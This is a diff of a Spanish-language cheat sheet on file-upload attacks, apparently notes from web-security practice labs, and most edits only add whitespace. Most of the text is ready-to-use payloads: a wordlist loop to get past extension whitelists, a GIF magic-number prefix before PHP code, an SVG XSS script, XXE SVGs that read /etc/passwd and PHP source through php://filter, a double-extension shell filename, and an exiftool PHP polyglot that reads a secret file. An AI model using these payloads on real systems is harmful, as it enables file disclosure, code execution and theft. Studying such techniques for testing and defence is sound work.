@@ -5,6 +5,7 @@
 
 
 
+
 #### Generar bash con wordlists para bypassear whitelists:
 
         for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
@@ -18,14 +19,15 @@
 
 
 #### Siempre agregar, previo al código malicioso un "tipo de archivo" en base a los magicnumbers:
-"
-GIFF8
-<?php .... ?>
+        "
+        GIFF8
+        <?php .... ?>
 
 #### XSS:
 
 Añadir código malicioso en la metadata de los archivos.
 sgv example:
+
         <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
             <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
             <script type="text/javascript">alert(window.origin);</script>
@@ -35,11 +37,13 @@ sgv example:
 #### XXE:
 
 leer un archivo en el servidor
+
         <?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
         <svg>&xxe;</svg>
 
 #### Ver código fuente de un archivo php:
+
         <?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
         <svg>&xxe;</svg>
@@ -79,7 +83,7 @@ los archivos: shell.p.phphp
 
 #### Polyglot php en una imagen:
 
-exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+        exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
 
 
 
